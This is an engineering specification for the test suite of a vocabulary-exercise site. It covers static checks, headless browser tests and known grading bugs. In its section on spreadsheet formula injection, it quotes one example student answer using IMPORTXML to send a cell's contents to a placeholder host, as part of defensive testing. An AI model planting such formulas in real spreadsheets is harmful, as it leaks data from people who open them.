# Activities test suite — specification

**Status:** Step 2 (the static layer) is implemented and running in the build graph.
Steps 3–5 are specified, not built.
**Repo:** `EnglishOnlineTraining/vocab-games`
**Goal:** prove every exercise on the activities hub loads, grades correctly and submits
the right payload — before it reaches students.

This revises an earlier draft after checking each of its assumptions against the repo.
Three of them were wrong about this codebase and four proposed components already
existed; both are recorded in §10 so the same ground is not re-walked.

---

## 1. Principles

1. **Test the working tree after `node scripts/build.js`.** There is no build output
   directory — the generators rewrite files in place (`outputs: ['*.html']` in
   `scripts/pipeline.js`) and GitHub Pages serves `main`'s root. Regenerability is a
   separate assertion, already made by `node scripts/build.js --check`.
2. **Never fire a real submission.** Intercept and assert the payload. Do not send it.
3. **No LLM in the test loop.** Plain Node. Deterministic. Same input, same result.
4. **Derive file paths from `docs/inventory.json`.** Never construct URLs from a string
   template.
5. **Wait on state, never on time.** No `waitForTimeout`.
6. **Cheapest layer first.** If a static check can catch it, do not launch a browser.
7. **Derive the contract; do not declare it.** See §2.

---

## 2. The test contract — derived

A page's obligations are inferred from what it declares, not from attributes added for
the benefit of tests.

**Why.** An earlier draft required `data-template-version`, `data-grade-system` and five
`data-testid` hooks on all 187 framework pages. Measured against the repo, the contract
those hooks would create already held: `#step-0`, `#progress-fill` and
`#summary-container` were present on 185/187, `#step-nav` on 183, `#submit-btn` on 184,
and `#score-display` on every one of the 161 pages that grade through `checkDropdowns`.
The two pages without `#step-0` are `grammar-activities.html` and
`esl-grammar-activities.html`, which load `exercise.js` for the shared chrome and are
not exercises.

Backfilling would therefore have renamed working hooks across 187 files to learn
nothing, while creating a second contract that `exercise.js` never reads — one that can
be green while the page is broken. It would also have to run inside the build graph or
`build-head.js`, which owns a block on every page and must run last, would overwrite it.
Injecting the hooks from `exercise.js` instead (the `eolInitA11y` pattern) would make
them invisible to the static layer, which is the cheapest and most valuable one.

**The rule.** From `docs/inventory.json`:

| Applies to | Requirement |
|---|---|
| every framework page | `#step-0`, `#progress-fill`, `#summary-container`, `#step-nav` |
| calls `submitToSheet()` | `#submit-btn` — the framework dereferences it unguarded |
| records a score | `#score-display` |
| `architecture: 'framework'` | resolvable `UNIT` and `TOTAL_STEPS` |

Requirements are **capability-based, not uniform.** Three pages would fail a blanket
rule while being correct: `10c-london-slang.html` has its own `submitAnswers()` and needs
no `#submit-btn`; `uni-project-management.html` and
`uni-roleplay-building-relationships.html` are free-text and record no score.

`data-template-version` remains the one attribute worth adding, because it is genuinely
new information that cannot be derived. It is not yet implemented; when it is, it should
be emitted by `build-head.js` into its existing `HEAD:*` block.

### 2.1 Grade systems

The only two values are `default` (the classroom Punktetabelle) and `msa` (the 2018
Berlin/Brandenburg MSA Bewertungstabelle). `it`, `business` and `uni` are course
categories, not grading systems. `default` is the absence of a `GRADE_SYSTEM`
declaration, so it is derived rather than written onto 165 pages.

## 3. The inventory — `docs/inventory.json`

Generated by `scripts/inventory.js`, which also writes the human-readable
`docs/INVENTORY.md` from the same parse. Per page: `file`, `architecture`, `generated`,
`unit`, `totalSteps`, `gradeSystem`, `submissionType`, `answerKeyType`, `gradable`,
`lang`, `linked`, `title`.

**Classify on what the page declares, not its filename.** A page is an exercise because
it declares `UNIT` and `TOTAL_STEPS`. Prefix-based classification has already failed here
once — hence `LEGACY_UNPREFIXED` in `build-exercise-data.js`.

It is a node in the build graph with `needs: ['head']`, so it always describes the
finished pages and `build.js --check` keeps it honest. It was outside the graph until
2026-08-30, and `docs/INVENTORY.md` had drifted to claiming 170 files and 128 exercises
against a real 236 and 184.

Current shape: 236 pages — 184 framework, 20 Abitur, 16 hubs, 11 standalone, 4 lead
magnets, 1 template. 167 framework pages are gradable, of which 161 expose a
machine-readable answer key.

## 4. Step 2 — static checks (implemented)

`node scripts/check-activities.js`, registered in `CHECKERS` in `scripts/pipeline.js` so
it runs on every `node scripts/build.js`. Dependency-free Node, consistent with
`check-syntax.js`. Reuses `scripts/extract-graded.js` as a module — `gradedCalls`,
`gapDetail`, `unitOf` — so answer-key parsing lives in one place.

It must be a `CHECKER` and not a `VALIDATOR`: it reads `docs/inventory.json`, which the
`inventory` node writes at the end of the build, and it inspects generated markup.

1. **Manifest integrity** — every file in `data/exercises.json` exists; no duplicates;
   every hub link resolves; no exercise is unreachable from every hub. Pages listed in
   `data/withheld.json` are exempt from the orphan rule and get the inverse one instead:
   a withheld page that is still linked from a hub fails the build, so withholding
   cannot be quietly undone.
2. **Endpoint well-formedness** — `SHEET_URL` must parse as `https:` on the allowlist
   (`hook.eu1.make.com`, `script.google.com`). Also flags unreplaced `PASTE_*`/`TODO_*`
   scaffolding outside `_template.html`. A page's own endpoint is public by construction
   and is never itself a finding; committed API keys, bearer tokens and private keys are.
3. **Contract compliance** — the derived rule in §2.
4. **Answer-key sanity** — no gap with zero correct answers, none whose key is absent
   from its own options, none where every option is accepted, option counts within 2–12.
5. **Apps Script write safety** — §4.1.
6. **Migration inventory** — the 19 `msa` pages are printed as output, never a failure.

### 4.1 Spreadsheet formula injection

A student answer is user-controlled text that lands in a cell the teacher later opens.
Sheets and Excel both treat a leading `=`, `+`, `-` or `@` as a formula, so an answer of
`=IMPORTXML("https://example.invalid/?"&A1,"//x")` is executed rather than stored.

The check drives `routeSubmission()` from `apps-script.gs` against a mocked
`SpreadsheetApp` — nothing touches a real spreadsheet — through both the universal
handler and a bespoke column layout.

**Scope is `apps-script.gs` only**, which is the Business English / University / IT path.
Year 7–10 and MSA submit to Make → Excel `addATableRow`, whose behaviour lives in a Make
scenario and cannot be exercised from this repo.

**It currently fails, by design.** `appendRow()` writes raw values with no
neutralisation. Both paths are recorded in the baseline (§7) with the proposed fix,
because fixing it means editing `apps-script.gs` *and* redeploying both sheet scripts —
an operational step, not a code change.

### 4.2 Gaps built at runtime

`uni-relationships-vocab.html` writes its `exA-v*` selects with `innerHTML` from a data
array; `california-exercises.html` has `renderGapText`. Those elements do not exist in
the source, so a static reader must not claim they are missing. The checker detects
prefix concatenation, records the count as *not statically verifiable*, still validates
what the answer key alone can prove, and leaves the rest to Step 3. The count is printed
on every run so this can never quietly grow.

### Acceptance

Runs on every build and in CI. Exits non-zero on any finding not in the baseline.
Verified in both directions: dropping a baseline entry and introducing a single-character
typo in a page id each produce exit 1.

## 5. Step 3 — headless behaviour tests (not built)

Playwright against the working tree. Runs pre-merge.

### 5.1 Serve on a non-localhost host

**This is the trap that makes the whole layer worthless if missed.** `isTestMode()`
returns true for `localhost` and `127.0.0.1`, and `submitToSheet()` returns before
`fetch` in that branch. Served from localhost, no request ever leaves the page: route
interception observes nothing and "fail if a real request escapes" is satisfied
trivially. This has already produced one false pass in this project — the
`it-writing-task.html` email gate on 2026-08-07, where "zero POSTs for valid addresses"
read as the gate working when nothing had ever fetched.

Serve on the container IP (`hostname -I`). Keep the escape-detector as a safety net, not
as the assertion.

`buildPayload()` runs *before* the test-mode check, so payload **shape** can be asserted
in Node with a DOM stub and no browser at all — cheapest layer first.

### 5.2 Per page

1. Drive **`?mode=practise` first.** It is the public no-sign-up path with no teacher to
   notice breakage, and it needs no network at all.
2. Take the answer key through the inventory's `answerKeyType`. Keys are inline JS —
   a literal in the `checkDropdowns` call or a named variable (`answers`, `ANSWERS.A`) —
   and are **never in the DOM**.
3. Fill correct answers; assert full marks and that the Note matches the page's declared
   grade system.
4. Fill deliberately wrong answers where a deterministic fixture exists; otherwise record
   `not_applicable` with a reason.
5. Walk every step; assert the step nav and progress bar advance.

### 5.3 Submission interception

Stub the network call, assert the payload fields and the endpoint, then **abort the
request**. Fail the suite if anything reaches Make or Apps Script. Because `no-cors`
responses are opaque, assert the UI reports delivery as *unconfirmed* unless a separate
acknowledgement endpoint exists.

### 5.4 Error capture, mobile, known limits

Listen for `pageerror`, `console` errors and `requestfailed`. One pass at 380px asserting
no horizontal overflow, run **after** `?mode=practise` renders results, since the rubric
and score card are the widest content. MSA listening uses browser TTS and headless
Chromium has no voices: assert the speech API is *called* with the right text, not that
audio plays.

---

## 6. Step 4 — production liveness (not built)

Nightly. GET every live URL, assert 200 and `text/html`. Fully load three sampled pages
and assert no console errors. Sample by **deterministic date rotation**, not randomly —
a random sample contradicts Principle 3.

## 7. Reporting and the baseline

Failures are bucketed `infra` (did not load), `contract` (loaded, could not be driven) or
`logic` (drove fine, wrong result).

`docs/activities-baseline.json` holds known, accepted failures. Only *new* failures fail
the run. Every entry carries `id`, `owner`, `reason`, `firstSeen` and `review`, and
changes to it go through review like any other diff. The `id` is stable across runs
(`check:file[:detail]`), which is what the match is on.

Reports must show **`answer keys machine-readable / gradable pages`** so
`not_applicable` cannot quietly become most of the suite.

Step 5 of the original plan — a diffable `activities-test-report.json` and an HTML
summary — is still outstanding; today the checker prints to stdout.

## 8. Invocation

```
node scripts/build.js            # build, then validators + checkers incl. check-activities
node scripts/check-activities.js # the static layer alone
node scripts/check-activities.js --list   # report without failing
node test-scoring.js             # scoring + GRADE_TABLE unit tests
```

There is no `package.json`. The static layer is deliberately dependency-free, like every
other script here; Playwright would be the repo's first dependency and should be isolated
to Step 3 alone.

CI: `check-generated.yml` runs `--explain` then `--check` on PRs;
`rebuild-indices.yml` runs the build unflagged on pushes to `main`.

---

## 9. Out of scope

- Subjective content quality — grammar, pedagogy, tone.
- Accessibility auditing beyond the 380px overflow check. `eolInitA11y` is already a
  deliberate site-wide layer.
- Load, performance, rate limiting. GitHub Pages is a CDN.
- Any test that writes to a real submission backend.

---

## 10. Assumptions this spec corrected

Recorded so they are not reintroduced.

| Earlier claim | Reality |
|---|---|
| "Test the build output directory" | There is none; generators rewrite in place. |
| "Does `8g-usa-children.html` exist?" | It never did. The page is `8g-kids-in-america.html`. |
| "Read the fetch call to learn the payload" | Correct, but `isTestMode()` means a localhost run never fetches (§5.1). |
| "Generate an inventory" | `scripts/inventory.js` already existed; it was extended, not replaced. |
| "Build an answer-key adapter" | `scripts/extract-graded.js` already exports one. |
| "Write grading unit tests" | `test-scoring.js` already loaded `exercise.js` under a DOM stub. |
| "Add npm scripts" | No `package.json`; checks belong in `pipeline.js`, which is already the CI gate. |
| Answer keys might be in the DOM | They are always inline JS. |

`exercise.js` has **no `module.exports`**. `test-scoring.js` reads it and `eval`s it
against a stubbed DOM; that is the only way in, and `require` will not work.

## 11. Known issues raised by building this

1. **`uni-al-munir-relationships.html` — withheld 2026-08-30.** Its `SHEET_URL` was
   never replaced, so every submission failed and the student's work was lost. It is
   now listed in `data/withheld.json`: the file stays, but it gets no hub card, no
   `data/exercises.json` entry, no sitemap URL and no JSON-LD `ItemList` entry, so
   nobody can reach it. The endpoint is a one-line fix (the other `uni-*` pages use a
   working Apps Script URL); the real blocker is the Listening Task, whose audio is a
   placeholder with no transcript in the page to generate speech from.
2. **Apps Script formula injection**, §4.1. Baselined, with the fix in the entry.
3. **`lookupGrade` scales inconsistently.** `Math.round` is applied only when `possible`
   is outside 10–100; inside the band the raw score is compared. The same 95%
   performance grades **Note 2 at 9.5/10 and Note 1 at 4.75/5** — a full grade band
   decided by exercise length rather than by the student. Reachable since scoring went
   fractional. Pinned by assertion in `test-scoring.js`; it is a pedagogical decision,
   not a bug to fix silently.
4. **`extract-graded.js:unitOf()` matches `var UNIT` only**, while two pages declare
   `const UNIT`. Harmless today — neither page has graded gaps — so it was left alone
   rather than churning generated review pages. `check-activities.js` watches for the
   two resolvers disagreeing.
